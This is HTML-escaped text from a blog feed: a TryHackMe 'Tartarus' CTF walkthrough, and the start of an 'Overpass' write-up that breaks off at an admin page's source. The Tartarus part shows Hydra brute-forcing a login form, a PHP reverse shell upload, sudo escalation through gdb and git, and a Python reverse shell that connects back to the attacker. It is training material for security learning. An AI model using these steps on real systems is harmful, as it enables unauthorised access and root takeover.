  &lt;li&gt;80 - HTTP - Apache web server&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;SSH has a smaller attack surface than the other ports so will leave that for now, I decided to look at FTP first.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Using the ftp utility I was able to login using the username ‘anonymous’ and password ‘anonymous’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $ftp tartarus
Connected to tartarus.
220 (vsFTPd 3.0.3)
Name (tartarus:daz): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp&amp;gt; ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just one file test.txt, but what is also interesting is ‘…’ which is a folder. Typically you would find . (current directory) and .. (parent directory). Next I downloaded the test.txt file and checked the … directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;ftp&amp;gt; get test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (17 bytes).
226 Transfer complete.
17 bytes received in 0.00 secs (38.8795 kB/s)
ftp&amp;gt; cd ...
250 Directory successfully changed.
ftp&amp;gt; ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
226 Directory send OK.
ftp&amp;gt; cd ...
250 Directory successfully changed.
ftp&amp;gt; ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
226 Directory send OK.
ftp&amp;gt; get yougotgoodeyes.txt
local: yougotgoodeyes.txt remote: yougotgoodeyes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes).
226 Transfer complete.
14 bytes received in 0.00 secs (19.1215 kB/s)
ftp&amp;gt; exit
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Navigating to … lists another folder called … but now we find another text file called yougotgoodeyes.txt.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $cat test.txt 
vsftpd test file
┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $cat yougotgoodeyes.txt 
/sUp3r-s3cr3t
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;test.txt doesn’t give us anything to interesting, nmap was able to identify the FTP server was vsftpd. However, yougotgoodeyes.txt provides what looks like a web directory. Next step is to move on to port 80 and see what we can find. While I was reviewing FTP I had gobuster and nikto running in the background to enumerate the web service.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The webpage just displays the default apache page, I checked the source code but nothing stood out.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $gobuster dir -u http://tartarus -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://tartarus
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/26 16:32:10 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2020/09/26 16:34:00 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Gobuster also didn’t reveal anything.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $nikto -host http://tartarus
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.30.144
+ Target Hostname:    tartarus
+ Target Port:        80
+ Start Time:         2020-09-26 16:31:43 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ &quot;robots.txt&quot; contains 1 entry which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5a9b87b015a4a, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7686 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2020-09-26 16:35:39 (GMT1) (236 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nikto was able to find robots.txt with one entry.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/robots.png&quot; alt=&quot;robots&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great now I have the admin directory and a potential username ‘d4rckh’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/admin-dir.png&quot; alt=&quot;admin-dir&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Checking out the admin-dir I found to files credentials.txt and userid. I download each to my machine.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;userid - Is a list of random usernames&lt;/li&gt;
  &lt;li&gt;credentials.txt - Is a list of common passwords&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We could use these to brute force SSH but first I will look at the directory ‘/sUp3r-s3cr3t/’ found on the FTP service.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I bet the username/password lists we found are to be used here, I tried to login with admin/admin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/username.png&quot; alt=&quot;username&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But I get the error ‘Incorrect username!’. Its highlighting the username is wrong, not the username or password is wrong. I can use this error message along with the userid file to find the correct username(s).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $hydra -L userid -p &quot;test&quot; tartarus http-post-form &quot;/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect username!&quot;
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 16:53:45
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries (l:13/p:1), ~1 try per task
[DATA] attacking http-post-form://10.10.30.144:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect username!
[80][http-post-form] host: 10.10.30.144   login: &amp;lt;HIDDEN&amp;gt;   password: test
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 16:53:55
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used hydra to test each of the usernames to see which were failed.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;-L - username file&lt;/li&gt;
  &lt;li&gt;-p - I used “test” as a place holder password for now&lt;/li&gt;
  &lt;li&gt;tartarus - The target&lt;/li&gt;
  &lt;li&gt;http-post-form - Perform a POST request&lt;/li&gt;
  &lt;li&gt;/sUp3r-s3cr3t/authenticate.php: - Is the directory/webpage to target&lt;/li&gt;
  &lt;li&gt;username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login: - These are the values the webpage is expecting, ^^ tell Hydra what to populate in those fields.&lt;/li&gt;
  &lt;li&gt;Incorrect username! - Tells hydra what a failed message will include&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We have a username, I repeated the process but this time to check for the password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $hydra -l &amp;lt;HIDDEN&amp;gt; -P credentials.txt 10.10.30.144 http-post-form &quot;/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect password!&quot;
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 17:02:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 101 login tries (l:1/p:101), ~7 tries per task
[DATA] attacking http-post-form://10.10.30.144:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect password!
[80][http-post-form] host: 10.10.30.144   login: &amp;lt;HIDDEN&amp;gt;   password: &amp;lt;HIDDEN&amp;gt;
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 17:02:24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All I need to change was the error message, the username and password flags and values. Now with the username and password I will try and log in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It worked and now im presented with a upload page, first thing that comes to mind is a PHP reverse shell. First I will gobuster for other directories.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $gobuster dir -u http://tartarus/sUp3r-s3cr3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://tartarus/sUp3r-s3cr3t
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/26 17:12:07 Starting gobuster
===============================================================
/images (Status: 301)
===============================================================
2020/09/26 17:20:54 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Inside images is a folder called uploads, this is what I needed. Now I know where my shell will be uploaded.&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;First I copy a php reverse shell script from my webshells directory found on both ParrotOS and Kali and rename it to shell.php.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $mv php-reverse-shell.php shell.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Editing the script I will keep port as 1234 for now and change the IP to point to my VPN IP.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;set_time_limit (0);
$VERSION = &quot;1.0&quot;;
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I start my netcat listener ready for my shell (hopefully).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $nc -nvlp 1234
listening on [any] 1234 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/uploaded.png&quot; alt=&quot;uploaded&quot; /&gt;&lt;/p&gt;

&lt;p&gt;File uploaded.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/shell.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As expected the shell.php script was uploaded to /images/uploads/&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.30.144] 52738
Linux ubuntu-xenial 4.4.0-184-generic #214-Ubuntu SMP Thu Jun 4 10:14:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:18:28 up  1:10,  0 users,  load average: 0.10, 0.05, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we have a shell I will go hunting for the user flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ cd /home
$ ls
cleanup
d4rckh
thirtytwo
$ cd d4rckh
$ ls
cleanup.py
user.txt
$ cat user.txt
0f7dbb2243e692e&amp;lt;HIDDEN&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ive redacted half the flag. Now its time to get root!&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;First I upgrade my shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In d4rckh home directory is a python script cleanup.py. Even as www-data you can edit that file and use it to get a reverse shell as root. However I don’t believe this is the indented path just yet, first we need to become the d4rckh user.&lt;/p&gt;

&lt;p&gt;When I first get a shell on machine I always run ‘sudo -l’ to check for a quick win.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu-xenial:/home/d4rckh$ sudo -l
Matching Defaults entries for www-data on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu-xenial:
    (thirtytwo) NOPASSWD: /var/www/gdb
www-data@ubuntu-xenial:/home/d4rckh$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Im not disappointed, we can run the command gdb as the user thirtytwo. A quick look on &lt;a href=&quot;https://gtfobins.github.io/gtfobins/gdb/#sudo&quot;&gt;GTFObins&lt;/a&gt; shows I can use gdb to priv esc to the thirtytwo user.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu-xenial:/home/d4rckh sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;x86_64-linux-gnu&quot;.
Type &quot;show configuration&quot; for configuration details.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
For help, type &quot;help&quot;.
Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.
$ 
$ id
uid=1004(thirtytwo) gid=1004(thirtytwo) groups=1004(thirtytwo)
$ cd /home/thirtytwo
$ ls
note.txt
$ cat note.txt
Hey 32, the other day you were unable to clone my github repository.
Now you can use git. Took a while to fix it but now its good :)

~D4rckh
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now has user thirtytwo I navigate to the home directory and find a note from D4rckh. So again I checked ‘sudo -l’.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
Matching Defaults entries for thirtytwo on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User thirtytwo may run the following commands on ubuntu-xenial:
    (d4rckh) NOPASSWD: /usr/bin/git
$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Following the same processes before, I checked GTFO bins and found a a priv esc path using git.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -u d4rckh /usr/bin/git -p help config
GIT-CONFIG(1)                     Git Manual                     GIT-CONFIG(1)

NAME
       git-config - Get and set repository or global options

SYNOPSIS
       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] name [value [value_regex]]
       git config [&amp;lt;file-option&amp;gt;] [type] --add name value
       git config [&amp;lt;file-option&amp;gt;] [type] --replace-all name value [value_regex]
       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] --get name [value_regex]
       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] --get-all name [value_regex]
       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] [--name-only] --get-regexp name_regex [value_regex]
       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] --get-urlmatch name URL
       git config [&amp;lt;file-option&amp;gt;] --unset name [value_regex]
       git config [&amp;lt;file-option&amp;gt;] --unset-all name [value_regex]
       git config [&amp;lt;file-option&amp;gt;] --rename-section old_name new_name
       git config [&amp;lt;file-option&amp;gt;] --remove-section name
       git config [&amp;lt;file-option&amp;gt;] [-z|--null] [--name-only] -l | --list
       git config [&amp;lt;file-option&amp;gt;] --get-color name [default]
       git config [&amp;lt;file-option&amp;gt;] --get-colorbool name [stdout-is-tty]
       git config [&amp;lt;file-option&amp;gt;] -e | --edit
!/bin/bash
d4rckh@ubuntu-xenial:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I’m the user d4rckh I can go back to the users home directory and look at the cleanup.up script.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py
# -*- coding: utf-8 -*-
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /home/cleanup/* ')
except:
        sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Reading the script it looks like something that would be ran via cronjob. Lets see what jobs are on the machine.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;d4rckh@ubuntu-xenial:/home/d4rckh$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2 *   * * *   root    python /home/d4rckh/cleanup.py
17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
#
d4rckh@ubuntu-xenial:/home/d4rckh$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfect, so that script is being run by root. Lets modify to provide us with another reverses shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $nc -nvlp 8080
listening on [any] 8080 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;First start another netcat listener.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py 
# -*- coding: utf-8 -*-
#!/usr/bin/env python

import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((&quot;&amp;lt;HIDDEN&amp;gt;&quot;,8080))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I grabbed the python reverse shell from &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;pentestmonkey&lt;/a&gt; and replaced the code in the script. Now I just need to wait for the reverse shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $nc -nvlp 8080
listening on [any] 8080 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.30.144] 33596
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root/
# cat root.txt
7e055812184a5fa&amp;lt;HIDDEN&amp;gt;
# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Root dance!&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">Overpass Write Up</title><link href="https://darrynbrownfield.co.uk/overpass" rel="alternate" type="text/html" title="Overpass Write Up" /><published>2020-09-12T00:00:00+00:00</published><updated>2020-09-12T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/overpass</id><content type="html" xml:base="https://darrynbrownfield.co.uk/overpass">&lt;p&gt;&lt;img src=&quot;/assets/images/overpass/cover.png&quot; alt=&quot;GitHappens&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;Overpass is an easy room from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; with the description:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;What happens when a group of broke Computer Science students try to make a password manager? 
Obviously a perfect commercial success!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The room is part of the Overpass series, over the next few weeks I plan to provide a write up for each series machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/overpass/series.png&quot; alt=&quot;THMSeries&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have two tasks to complete, finding both the user and root flag. Typical CTF style room. Also a TryHackMe subscription code was hidden in the box, the first person to find and activate got a one month subscription for free. This has long been claimed however we will also find the code as part of the write up.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, the IP I will be targeting is ‘10.10.70.101’. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.70.101
[sudo] password for daz: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 10:47 BST
Nmap scan report for 10.10.70.101
Host is up (0.039s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.76 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Only 2 ports open SSH and HTTP. I will start with HTTP as SSH as a smaller attack surface however the SSH banner does indicate its a Ubuntu machine. Also interestingly the HTTP banner is showing Golang net. Go is a open source programming language by Google.&lt;/p&gt;

&lt;p&gt;First I will take a look at the webpage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/overpass/homepage.png&quot; alt=&quot;THMSeries&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Clicking around its a basic webpage for a secure password manager. On the ‘About Us’ page I found a list of usernames:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Ninja - Lead Developer&lt;/li&gt;
  &lt;li&gt;Pars - Shibe Enthusiast and Emotional Support Animal Manager&lt;/li&gt;
  &lt;li&gt;Szymex - Head Of Security&lt;/li&gt;
  &lt;li&gt;Bee - Chief Drinking Water Coordinator&lt;/li&gt;
  &lt;li&gt;MuirlandOracle - Cryptography Consultant&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These may be helpful later.&lt;/p&gt;

&lt;p&gt;Also a download page is available to download the software.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/overpass/downloads.png&quot; alt=&quot;Downloads&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ive downloaded a copy of the Linux binary, the source code and the build script. Before I look at them I ran a gobuster on the webpages to check for any other directories.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]                                                                
└──╼ $gobuster dir -u http://10.10.70.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================                                                
Gobuster v3.0.1                                                                                                
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)                                                
===============================================================                                                
[+] Url:            http://10.10.70.101                                                                        
[+] Threads:        50                                                                                         
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                               
[+] Status codes:   200,204,301,302,307,401,403                                                                
[+] User Agent:     gobuster/3.0.1                                                                             
[+] Timeout:        10s                                                                                        
===============================================================                                                
2020/09/19 10:54:56 Starting gobuster                                                                          
===============================================================                                                
/img (Status: 301)                                                                                             
/downloads (Status: 301)
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/admin is new. This brings me to a simple login page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/overpass/admin.png&quot; alt=&quot;admin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried various combinations of basic logins, admin/admin, admin/password etc but nothing worked. So I had a look at the source code for the admin page.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
